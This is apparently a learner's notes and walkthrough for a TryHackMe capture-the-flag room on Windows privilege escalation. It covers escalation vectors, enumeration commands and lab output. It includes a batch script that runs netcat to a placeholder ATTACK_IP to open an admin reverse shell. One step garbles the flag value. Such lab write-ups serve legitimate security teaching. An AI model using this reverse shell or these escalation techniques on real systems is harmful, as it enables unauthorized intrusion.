# They Lost the Plan!


## Privileges
- A privileged account - Administrator on Windows or Root on Linux - will allow you to access any file on the system
    - An account with lower privileges will make it more difficult
- Windows account types
    - Domain Administrators - the highest account level in an enterprise alone with Enterprise Administrators
        - Can access and manage all accounts
    - Services - Accounts used by software to perform their tasks such as backups or antivirus scans
    - Domain users - Accounts used by employees, have just enough privileges to do their jobs
    - Local accounts - only valid on the local system anc cannot be used over the domain
- Accounts can be easily managed with groups

## Windows Privilege Escalation Vectors
- Stored Credentials - Important credentials can be saved in files by user or in config files of an application
- Windows Kernel Exploit - The windows installed on the system can have a known vulnerability that can be exploited
- Insecure File/Folder Permissions - In some situations, even a low privileged user can have read or write privileges over files and folders that contain sensitive info
- Insecure Service Permissions - Low privileged users may have rights over services
- DLL Hijacking: Applications use DLL files to support their execution. You can think of these as smaller applications that can be launched by the main application. Sometimes DLLs that are deleted or not present on the system are called by the application. This error doesn't always result in a failure of the application, and the application can still run. Finding a DLL the application is looking for in a location we can write to can help us create a malicious DLL file that will be run by the application. In such a case, the malicious DLL will run with the main application's privilege level. If the application has a higher privilege level than our current user, this could allow us to launch a shell with a higher privilege level.
- Unquoted Service Path - If the executable path of a service contains a space and is not enclosed within quotes, we can introduce maclicious executables to run instead of the intended executable
- Always Install Elevated - Windows applications can be installed using Windows Installer (MSI packages) files. Windows can be configured with the "AlwaysInstallElevated" policy, which allows the installation process to run with administrator privileges without requiring the user to have these privileges
    - If "AlwaysInstallElevated" is configured, a malicious executable packages as an MSI file could be run to obtain a higher privilege level
- Other software

## Initial Information Gathering
- Important step in privilige escalation because it's how you find potential attack vectors
- There are automated scripts available to do it for you
- Key enumeration points
    - Users on the target system
        - `net users` shows users on the system
    - OS version
        - `systeminfo | findstr /B /C: "OS Name"/C: "OS Version"`
        - This should be used to do further research
    - Installed Services
        - `wmic service list` lists services installed

## Exploitation
- Follow the instructions on tryhackme
- This code is used to create a reverse shell with admin privileges
```
@echo off
C:\Users\McSkidy\Downloads\nc.exe ATTACK_IP 1337 -e cmd.exe
```

## Exercise
1. Use `net users` to find pepper
```
C:\Program Files (x86)\Iperius Backup>net users
net users

User accounts for \\THE-GRINCH-HACK

-------------------------------------------------------------------------------
Administrator            Alabaster                DefaultAccount           
Guest                    McSkidy                  pepper                   
Rudolph                  sugarplum                thegrinch                
WDAGUtilityAccount       
The command completed successfully.
```

2. Use `systeminfo` to find `10.0.17763 N/A Build 17763`
```
C:\Program Files (x86)\Iperius Backup>systeminfo                                                   
systeminfo

Host Name:                 THE-GRINCH-HACK
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00430-00000-00000-AA262
Original Install Date:     3/17/2021, 2:59:06 PM
System Boot Time:          12/14/2021, 9:45:44 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     4,096 MB
Available Physical Memory: 2,962 MB
Virtual Memory: Max Size:  4,800 MB
Virtual Memory: Available: 3,766 MB
Virtual Memory: In Use:    1,034 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 27 Hotfix(s) Installed.
                           [01]: KB4601555
                           [02]: KB4470502
                           [03]: KB4470788
                           [04]: KB4480056
                           [05]: KB4486153
                           [06]: KB4493510
                           [07]: KB4499728
                           [08]: KB4504369
                           [09]: KB4512577
                           [10]: KB4512937
                           [11]: KB4521862
                           [12]: KB4523204
                           [13]: KB4535680
                           [14]: KB4539571
                           [15]: KB4549947
                           [16]: KB4558997
                           [17]: KB4562562
                           [18]: KB4566424
                           [19]: KB4570332
                           [20]: KB4577586
                           [21]: KB4577667
                           [22]: KB4587735
                           [23]: KB4589208
                           [24]: KB4598480
                           [25]: KB4601393
                           [26]: KB5000859
                           [27]: KB5001568
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.212.95
                                 [02]: fe80::a87a:67bf:5efd:d66d
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

3. Use the services tab of task manager to find IperiusSvc
4. Right click on the service in task manager > go to details > right click on IperiusService.exe > open file location to find `C:\Program Files (x86)\Iperius Backup\IperiusService.exe`
5. Run `whoami`
```
C:\Program Files (x86)\Iperius Backup>whoami
whoami
the-grinch-hack\thegrinch
```

6. Use `cd C:\Users\thegrinch` to move into the grinch's directory and look at the contents of all the folders. We find flag.txt and Schedule.txt inside the Documents folder. Use `more flag.txt` to find `cd C:\Users\thegrinch`
7. Use `more Schedule.txt` to find jazzercize
```
C:\Users\thegrinch\Documents>more Schedule.txt
more Schedule.txt
Daily Schedule:
4:00 - wallow in self-pity 
4:30 - stare into the abyss 
5:00 - solve world hunger, tell no one
5:30 - jazzercize
6:30 - dinner with me. I can�t cancel that again 
7:00 - wrestle with my self-loathing
```
